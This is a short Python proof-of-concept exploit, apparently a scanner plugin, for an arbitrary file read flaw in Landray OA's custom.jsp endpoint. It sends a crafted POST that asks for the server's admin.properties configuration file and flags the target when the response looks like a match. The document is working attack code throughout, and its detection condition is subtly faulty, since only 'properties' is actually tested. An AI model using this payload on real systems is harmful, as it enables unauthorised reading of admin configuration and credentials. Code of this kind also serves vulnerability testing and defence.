import requests
from lib.get_normal_url import get_standard_url
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def poc(target):
    try:
        target = get_standard_url(target)
        url = target + '/sys/ui/extend/varkind/custom.jsp'
        data = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
        req = requests.post(url,headers=headers,data=data)
        if "password" and "properties" in req.text and req.status_code == 200:
            print("\033[0;31m 蓝凌OA custom.jsp 任意文件读取漏洞："+ url )
    except:
        pass


